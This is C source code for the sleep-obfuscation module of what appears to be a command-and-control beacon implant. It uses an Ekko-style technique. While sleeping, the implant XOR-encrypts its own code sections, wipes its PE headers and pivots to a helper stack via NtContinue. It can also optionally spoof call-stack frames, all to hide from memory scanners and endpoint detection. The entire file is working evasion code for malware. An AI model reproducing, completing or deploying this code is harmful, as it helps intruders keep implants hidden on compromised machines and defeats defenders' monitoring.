#include "../include/sleep_obf.h"
#include "../include/sleep_utils.h"
#include "../include/utils.h"
#include "../include/pandragon_runtime.h"
/*
    shhhhhhhhhhhhhhhhhhhhhhhhhhhhhh

            Beacon is SLEEPING!!!!!!!!

*/
/* ---------------------------------------------------------------------------
 * Ekko Implementation Selection (from generated_config.h)
 * EKKO_IMPL = 0 : unused (morpheus/none selected), compiles with .obf defaults
 * EKKO_IMPL = 1 : .obf section (static)
 * EKKO_IMPL = 2 : runtime RX allocation (dynamic)
 * ========================================================================== */
#include "generated_config.h"
#if !defined(EKKO_IMPL)
#error "EKKO_IMPL not defined!"
#elif EKKO_IMPL == 0 || EKKO_IMPL == 1
#define EKKO_USE_OBF_SECTION 1
#define EKKO_USE_RUNTIME_RX  0
#elif EKKO_IMPL == 2
#define EKKO_USE_OBF_SECTION 0
#define EKKO_USE_RUNTIME_RX  1
#else
#error "Unknown EKKO_IMPL value"
#endif

/* ---------------------------------------------------------------------------
 * Section Attributes - Conditional based on EKKO_IMPL
 * ========================================================================== */
#if EKKO_USE_RUNTIME_RX
    #define EKKO_RX_SECTION __attribute__((section(".text$ekko")))
    #define EKKO_RX_MARKER_A __attribute__((section(".text$ekko$a"), used, noinline))
    #define EKKO_RX_MARKER_Z __attribute__((section(".text$ekko$z"), used, noinline))
    #define EKKO_SEC_ATTR
#elif EKKO_USE_OBF_SECTION
    #define EKKO_SEC_ATTR __attribute__((section(".obf")))
    #define EKKO_RX_SECTION EKKO_SEC_ATTR
    #define EKKO_RX_MARKER_A EKKO_SEC_ATTR
    #define EKKO_RX_MARKER_Z EKKO_SEC_ATTR
#else
    #define EKKO_RX_SECTION
    #define EKKO_RX_MARKER_A
    #define EKKO_RX_MARKER_Z
    #define EKKO_SEC_ATTR
#endif

/* noinline from utils.h expands to __attribute__((noinline)) which breaks
 * when nested inside __attribute__((section(".obf"), noinline)). */
#undef noinline

/* ---------------------------------------------------------------------------
 * Constants
 * --------------------------------------------------------------------------- */
#define MAX_EKKO_SECTIONS  16
#define EKKO_STACK_SIZE    0x4000       /* 16KB helper stack buffer */

/* ---------------------------------------------------------------------------
 * Context Structure
 * --------------------------------------------------------------------------- */

typedef struct _EKKO_CONTEXT {
    functionTable*    nt;

    /* Derived XOR key (config_key XOR beacon_id, counter-expanded) */
    uint8_t             xorKey[SLEEP_XOR_KEY_LENGTH];

    /* Sections that got encrypted (need decrypt on wake) */
    SleepSectionInfo    sections[MAX_EKKO_SECTIONS];
    int                 sectionCount;

    /* PE header backup (if wipe enabled) */
    bool                wipePeHeaders;
    uint8_t             peHeaderBackup[0x1000];
    PVOID               imageBase;
    SIZE_T              imageSize;

    /* Control flags */
    volatile bool       wokeUp;

    /* Thread contexts - MUST BE 16-BYTE ALIGNED ON X64 */
    alignas(16) CONTEXT originalContext; /* Return to main loop */
    alignas(16) CONTEXT pivotContext;    /* Enter waiting loop */

    /* Synchronization */
    HANDLE              doneEvent;

    /* Timer handles */
    HANDLE              timerQueue;
    HANDLE              timer;

    /* Helper stack allocation */
    uint8_t*            helperStack;
    SIZE_T              helperStackSize;

    /* Saved NT_TIB values for restoration */
    PVOID               savedStackBase;
    PVOID               savedStackLimit;

    /* Runtime-allocated RX stub for WaitingLoop (only for EKKO_IMPL=2)
    maybe we should switcht to an union. TODO */
    PVOID               rxStubBase;
    SIZE_T              rxStubSize;
} EKKO_CONTEXT;

/* Global ctx pointer for the waiting loop */
static volatile EKKO_CONTEXT* g_EkkoCtx = NULL;

/* Persistent direct-syscall functionTable for Ekko (reused across sleep cycles) */
static functionTable* g_ekkofuncTable = NULL;

#ifdef _WIN64
#define CTX_RIP(ctx, f) ((ctx)->f.Rip)
#define CTX_RSP(ctx, f) ((ctx)->f.Rsp)
#define CTX_REG_CAST(x) ((DWORD64)(x))
#else
#define CTX_RIP(ctx, f) ((ctx)->f.Eip)
#define CTX_RSP(ctx, f) ((ctx)->f.Esp)
#define CTX_REG_CAST(x) ((DWORD)(x))
#endif

/* ==========================================================================
 * Forward declarations for RX stub functions (EKO_IMPL=2 only)
 * ========================================================================== */

typedef void (*WaitingLoopFn)();
typedef void (*XorCryptFn)(uint8_t*, SIZE_T, const uint8_t*, SIZE_T);
typedef void (*SecureZeroFn)(void*, SIZE_T);
typedef void (CALLBACK *TimerCallbackFn)(PVOID, BOOLEAN);

/* ==========================================================================
 * .text$ekko SUBSECTION - Functions here will be copied to runtime RX allocation
 * These functions are position-independent and don't call .text during sleep
 * ========================================================================== */

EKKO_RX_SECTION
__attribute__((noinline, used))
static void secureZero(void* buf, SIZE_T len) {
    volatile uint8_t* p = (volatile uint8_t*)buf;
    while (len--) *p++ = 0;
}

EKKO_RX_SECTION
__attribute__((noinline, used))
static void xorCrypt(uint8_t* data, SIZE_T len, const uint8_t* key, SIZE_T keyLen) {
    for (SIZE_T i = 0; i < len; i++)
        data[i] ^= key[i % keyLen];
}

/* ---------------------------------------------------------------------------
 * TimerCallback - Signal the event to wake up the waiting loop
 * --------------------------------------------------------------------------- */
EKKO_RX_SECTION
__attribute__((noinline, used))
static void CALLBACK SleepObf_TimerCallback(PVOID lpParameter, BOOLEAN) {
    EKKO_CONTEXT* ctx = (EKKO_CONTEXT*)lpParameter;
    if (ctx && ctx->nt && ctx->doneEvent) {
        ctx->nt->NtSetEvent(ctx->doneEvent, NULL);
    }
}

/* ---------------------------------------------------------------------------
 * WaitingLoop - Runs on helper stack while .text is encrypted.
 * This function is COPIED to a runtime RX allocation (EKKO_IMPL=2).
 * ========================================================================== */
EKKO_RX_SECTION
__attribute__((noinline, used))
static void __attribute__((ms_abi)) SleepObf_WaitingLoop() {
    EKKO_CONTEXT* ctx = (EKKO_CONTEXT*)g_EkkoCtx;
    if (!ctx || !ctx->nt) return;

    functionTable* nt = ctx->nt;
    HANDLE hProcess = (HANDLE)-1;

    /* 0. Encrypt sections: RW -> XOR -> RX */
    for (int i = 0; i < ctx->sectionCount; i++) {
        PVOID base = ctx->sections[i].base;
        SIZE_T size = ctx->sections[i].size;
        ULONG oldProtect = 0;
        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_READWRITE, &oldProtect);
        xorCrypt((uint8_t*)ctx->sections[i].base, ctx->sections[i].size, ctx->xorKey, SLEEP_XOR_KEY_LENGTH);
        base = ctx->sections[i].base;
        size = ctx->sections[i].size;
        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProtect);
    }

    /* 0b. Wipe PE headers if enabled */
    if (ctx->wipePeHeaders && ctx->imageBase) {
        PVOID hdrBase = ctx->imageBase;
        SIZE_T hdrSize = 0x1000;
        ULONG oldProtect = 0;
        volatile uint8_t* p = (volatile uint8_t*)ctx->imageBase;
        for (SIZE_T j = 0; j < 0x1000; j++) ctx->peHeaderBackup[j] = p[j];
        nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, PAGE_READWRITE, &oldProtect);
        for (SIZE_T j = 0; j < 0x1000; j++) p[j] = 0;
        hdrBase = ctx->imageBase;
        nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, oldProtect, &oldProtect);
    }

    /* 1. Wait for timer signal */
    nt->NtWaitForSingleObject(ctx->doneEvent, FALSE, NULL);

    /* 2. Decrypt sections (RW -> XOR -> RX) */
    for (int i = 0; i < ctx->sectionCount; i++) {
        PVOID base = ctx->sections[i].base;
        SIZE_T size = ctx->sections[i].size;
        ULONG oldProtect = 0;

        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_READWRITE, &oldProtect);
        xorCrypt((uint8_t*)ctx->sections[i].base, ctx->sections[i].size, ctx->xorKey, SLEEP_XOR_KEY_LENGTH);
        base = ctx->sections[i].base;
        size = ctx->sections[i].size;
        nt->NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProtect);
    }

    /* 3. Restore PE headers if wiped */
    if (ctx->wipePeHeaders && ctx->imageBase && ctx->peHeaderBackup[0] != 0) {
        PVOID hdrBase = ctx->imageBase;
        SIZE_T hdrSize = 0x1000;
        ULONG oldProtect = 0;
        nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, PAGE_READWRITE, &oldProtect);

        volatile uint8_t* dst = (volatile uint8_t*)ctx->imageBase;
        for (SIZE_T j = 0; j < 0x1000; j++) dst[j] = ctx->peHeaderBackup[j];

        hdrBase = ctx->imageBase;
        nt->NtProtectVirtualMemory(hProcess, &hdrBase, &hdrSize, oldProtect, &oldProtect);
        secureZero(ctx->peHeaderBackup, sizeof(ctx->peHeaderBackup));
    }

    /* 4. Restore original TEB limits before returning to original stack */
    if (ctx->helperStack) {
        PTEB teb = nt->parameters.TEB;
        if (teb) {
            teb->NtTib.StackBase  = ctx->savedStackBase;
            teb->NtTib.StackLimit = ctx->savedStackLimit;
        }
    }

    /* 5. Set wake flag and return to SleepObf_Ekko */
    ctx->wokeUp = true;
    nt->NtContinue(&ctx->originalContext, FALSE);
}

/* ==========================================================================
 * Helper Functions (Preparation) - These run BEFORE encryption, can stay in .text
 * ========================================================================== */

/* ==========================================================================
 * External symbols for .text$ekko subsection bounds (defined by linker)
 * Subsections sorted alphabetically: $a first, $z last
 * Only used when EKKO_USE_RUNTIME_RX=1
 * ========================================================================== */
#if EKKO_USE_RUNTIME_RX
EKKO_RX_MARKER_A
static void __text_ekko_start_marker() {}
EKKO_RX_MARKER_Z
static void __text_ekko_end_marker() {}

extern "C" {
    extern void __text_ekko_start_marker();
    extern void __text_ekko_end_marker();
}
#define __text_ekko_start ((char*)__text_ekko_start_marker)
#define __text_ekko_end   ((char*)__text_ekko_end_marker)
#else
/* Dummy definitions for EKKO_USE_OBF_SECTION */
#define __text_ekko_start ((char*)0)
#define __text_ekko_end   ((char*)0)
#endif

/* ==========================================================================
 * Main Entry Point: SleepObf_Ekko
 * ========================================================================== */

__attribute__((noinline))
bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep_ms, uint8_t jitter_pct) {
    (void)nt;

    if (!config) return false;

    if (!g_ekkofuncTable) {
        g_ekkofuncTable = InitializeFunctionTable(true, true, false, false);
        if (!g_ekkofuncTable) {
            g_debugPrint("[SleepObf_Ekko] Failed to initialize functionTable");
            return false;
        }
        g_debugPrint("[SleepObf_Ekko] Allocated persistent functionTable");
    }

    functionTable* ekkoNt = g_ekkofuncTable;

    EKKO_CONTEXT* ctx = (EKKO_CONTEXT*)ekkoNt->RtlAllocateHeap(ekkoNt->parameters.processHeap, HEAP_ZERO_MEMORY, sizeof(EKKO_CONTEXT));
    if (!ctx) {
        return false;
    }

    ctx->nt = ekkoNt;
    ctx->wipePeHeaders = config->options.sleep_wipe_pe_headers;
    
    PPEB peb = getCurrentPEB();
    ctx->imageBase = ((PLDR_DATA_TABLE_ENTRY)peb->LoaderData->InLoadOrderModuleList.Flink)->DllBase;
    
    ctx->sectionCount = enumerateCodeSections(ctx->imageBase, ctx->sections, MAX_EKKO_SECTIONS);
    deriveXorKey(ctx->xorKey, config->crypto_key, config->beacon_id);

#if EKKO_USE_RUNTIME_RX
    /* --- Allocate RX stub for WaitingLoop + helpers (no .obf section) --- */
    SIZE_T ekkoCodeSize = (SIZE_T)(__text_ekko_end - __text_ekko_start);
    if (ekkoCodeSize == 0 || ekkoCodeSize > 0x10000) {
        g_debugPrint("[SleepObf_Ekko] Invalid .text$ekko size: %zu", ekkoCodeSize);
        ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx);
        return false;
    }

    /* Allocate RW initially, then make RX after copy */
    PVOID rxStub = ekkoNt->RtlAllocateHeap(ekkoNt->parameters.processHeap, HEAP_ZERO_MEMORY, ekkoCodeSize);
    if (!rxStub) {
        g_debugPrint("[SleepObf_Ekko] Failed to allocate RX stub");
        ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx);
        return false;
    }

    /* Copy .text$ekko code to RX allocation */
    __memcpy(rxStub, __text_ekko_start, ekkoCodeSize);

    /* Verify copy integrity - check marker byte at start */
    if (*(volatile uint8_t*)rxStub != *(volatile uint8_t*)__text_ekko_start) {
        g_debugPrint("[SleepObf_Ekko] RX stub copy verification FAILED");
        ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, rxStub);
        ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx);
        return false;
    }

    /* Make it RX */
    ULONG oldProtect = 0;
    PVOID stubBase = rxStub;
    SIZE_T stubSize = ekkoCodeSize;
    ekkoNt->NtProtectVirtualMemory(NtCurrentProcess(), &stubBase, &stubSize, PAGE_EXECUTE_READ, &oldProtect);

    ctx->rxStubBase = rxStub;
    ctx->rxStubSize = ekkoCodeSize;
    g_debugPrint("[SleepObf_Ekko] Allocated RX stub at %p (size=%zu)", rxStub, ekkoCodeSize);
#else
    /* EKKO_USE_OBF_SECTION: WaitingLoop lives in .obf section, no RX stub needed */
    ctx->rxStubBase = NULL;
    ctx->rxStubSize = 0;
    g_debugPrint("[SleepObf_Ekko] Using .obf section for WaitingLoop");
#endif

    /* 1. Setup synchronization */
    ekkoNt->NtCreateEvent(&ctx->doneEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE);
    ekkoNt->RtlCreateTimerQueue(&ctx->timerQueue);
    uint32_t sleepTime = ApplySleepJitter(sleep_ms, jitter_pct);
    ekkoNt->RtlCreateTimer(ctx->timerQueue, &ctx->timer, (WAITORTIMERCALLBACK)SleepObf_TimerCallback, ctx, sleepTime, 0, WT_EXECUTEINTIMERTHREAD);

    /* 2. Capture original context (to return here after wake) */
    ctx->originalContext.ContextFlags = CONTEXT_FULL;
    ekkoNt->RtlCaptureContext(&ctx->originalContext);

    /* TRICK: Check if we just woke up. If so, originalContext was just restored by NtContinue. */
    if (ctx->wokeUp) {
        g_debugPrint("[+] Woke up! Resuming on original stack.");
        g_debugPrint("[+] Restored Rsp=0x%llX Rip=0x%llX",
                     (UINT64)CTX_RSP(ctx, originalContext),
                     (UINT64)CTX_RIP(ctx, originalContext));
        ekkoNt->NtClose(ctx->doneEvent);
        if (ctx->helperStack) {
            ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx->helperStack);
        }
#if EKKO_USE_RUNTIME_RX
        if (ctx->rxStubBase) {
            ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, ctx->rxStubBase);
        }
#endif
        ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx);
        return true;
    }

    /* 3. Prepare pivot context (to enter WaitingLoop on helper stack) */
    ctx->pivotContext.ContextFlags = CONTEXT_FULL;
    ekkoNt->RtlCaptureContext(&ctx->pivotContext);
    
#if EKKO_USE_RUNTIME_RX
    /* RIP points to WaitingLoop in our RX stub (not in .text) */
    SIZE_T waitingLoopOffset = (SIZE_T)&SleepObf_WaitingLoop - (SIZE_T)__text_ekko_start;
    CTX_RIP(ctx, pivotContext) = CTX_REG_CAST((BYTE*)ctx->rxStubBase + waitingLoopOffset);
#else
    /* RIP points directly to WaitingLoop in .obf section */
    CTX_RIP(ctx, pivotContext) = CTX_REG_CAST(&SleepObf_WaitingLoop);
#endif

    if (config->options.sleep_stack_spoof) {
        ctx->helperStackSize = EKKO_STACK_SIZE;
        ctx->helperStack = (uint8_t*)ekkoNt->RtlAllocateHeap(ekkoNt->parameters.processHeap, HEAP_ZERO_MEMORY, ctx->helperStackSize);
        if (ctx->helperStack) {
            UINT64 frameAddrs[256];
            uint16_t addrCount = 0;
            if (config->stack_chain_count > 0 && config->stack_chain) {
                for (uint16_t ci = 0; ci < config->stack_chain_count && addrCount < 256; ci++) {
                    if (config->stack_chain[ci].resolvedAddr != 0) {
                        frameAddrs[addrCount++] = config->stack_chain[ci].resolvedAddr;
                    }
                }
            }
            if (addrCount > 0) {
                uint16_t numFrames = config->num_spoof_frames;
                if (numFrames == 0) numFrames = 6;
                uint16_t maxFrames = (uint16_t)((ctx->helperStackSize - 0x400) / 0x80);
                if (numFrames > maxFrames) numFrames = maxFrames;
                for (uint16_t i = 0; i < numFrames; i++) {
                    SIZE_T off = 0x100 + (SIZE_T)i * 0x80;
                    if (off + 8 > ctx->helperStackSize - 0x200) break;
                    *(UINT64*)(ctx->helperStack + off) = frameAddrs[i % addrCount];
                }
            } else {
                g_debugPrint("[SleepObf_Ekko] Stack spoof: no resolved chain addresses, TEB swap only");
            }

            CTX_RSP(ctx, pivotContext) = CTX_REG_CAST(ctx->helperStack + ctx->helperStackSize - 0x200);

            PTEB teb = ekkoNt->parameters.TEB;
            ctx->savedStackBase = teb->NtTib.StackBase;
            ctx->savedStackLimit = teb->NtTib.StackLimit;
        }
    }

    g_debugPrint("[SleepObf_Ekko] [+] originalContext: Rsp=0x%llX Rip=0x%llX",
                 (UINT64)CTX_RSP(ctx, originalContext), (UINT64)CTX_RIP(ctx, originalContext));
#if EKKO_USE_OBF_SECTION
    g_debugPrint("[SleepObf_Ekko] [+] pivotContext: Rsp=0x%llX Rip=0x%llX (in .obf section)",
                 (UINT64)CTX_RSP(ctx, pivotContext), (UINT64)CTX_RIP(ctx, pivotContext));
#else
    g_debugPrint("[SleepObf_Ekko] [+] pivotContext: Rsp=0x%llX Rip=0x%llX (in RX stub)",
                 (UINT64)CTX_RSP(ctx, pivotContext), (UINT64)CTX_RIP(ctx, pivotContext));
#endif

    /* 4. Pivot stack and enter waiting loop */
    g_EkkoCtx = ctx;
    if (ctx->helperStack) {
        PTEB teb = ekkoNt->parameters.TEB;
        teb->NtTib.StackBase = (PVOID)(ctx->helperStack + ctx->helperStackSize);
        teb->NtTib.StackLimit = (PVOID)ctx->helperStack;
    }

    ekkoNt->NtContinue(&ctx->pivotContext, FALSE);
    return true; /* Never reached */
}
